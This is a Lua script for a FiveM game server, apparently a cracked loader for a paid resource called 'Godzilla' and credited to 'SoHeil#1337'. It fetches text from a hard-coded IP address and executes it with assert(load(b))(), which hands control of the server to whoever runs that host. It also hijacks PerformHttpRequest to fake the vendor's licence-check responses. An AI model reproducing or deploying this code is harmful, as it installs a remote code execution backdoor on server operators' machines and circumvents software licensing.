Citizen.CreateThreadNow(function()
  _SERVER = "168.119.79.103/~overwatc/crack/"
  DayToBws = true
  if GetResourceState("mysql-async") ~= "started" and GetResourceState("async") ~= "started" then
    return print([[
^5[OVERWATCH_HELPER]: ^1Failed to load script!
mysql-async or async not exist.^0]])
  end
  MySQL.Async.execute("SELECT * FROM godzilla", {}, function(a)
    a = a
    if a == 0 then
      DayToBws = true
      return print("^5[OVERWATCH_HELPER]: ^1Godzilla Database not exist!^7")
    end
    if DayToBws then
      PerformHttpRequest(_SERVER .. "godzilla_last.txt", function(a, b, c)
        a = a
        if not b then
        end
        if b ~= nil then
          _PerformHttpRequest = PerformHttpRequest
          function PerformHttpRequest(a, b, c, d, e)
            a = a
            if string.find(a, "http://godzlicencias.tk/version/version.json") then
              b(200, json.encode(va), {})
            elseif string.find(a, "http://godzlicencias.tk/keysuckmydickifyoureadthis/authorize.php") then
              b(200, json.encode(vb), {})
            else
              _PerformHttpRequest(a, b, c, d, e)
            end
          end
          print()
          print([[
             ^2Cracked by ^1SoHeil#1337^7
            Date of crack: 3/5/2021
    OVERWATCH Discord: ^2https://discord.gg/2uZVJtf
^4     __        ___  __            ___  __       
    /  \ \  / |__  |__) |  |  /\   |  /  ` |__| 
    \__/  \/  |___ |  \ |/\| /~~\  |  \__, |  |                                                   
^7]])
          assert(load(b))()
        else
          print("^5[OVERWATCH_HELPER]: ^1Server connection error!^7")
        end
      end, "POST", "")
    end
  end)
end)
